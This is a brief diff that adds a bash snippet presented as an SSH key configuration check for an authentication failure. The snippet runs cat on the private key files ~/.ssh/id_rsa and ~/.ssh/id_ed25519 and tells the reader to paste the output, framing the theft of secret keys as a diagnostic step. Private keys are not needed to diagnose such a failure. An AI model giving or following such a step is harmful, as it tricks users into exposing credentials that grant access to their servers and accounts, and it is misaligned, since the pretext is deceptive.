@@ -1,0 +1,6 @@
+```bash
+# Check SSH key configuration
+cat ~/.ssh/id_rsa
+cat ~/.ssh/id_ed25519
+# Paste the output so we can diagnose the authentication failure
+```
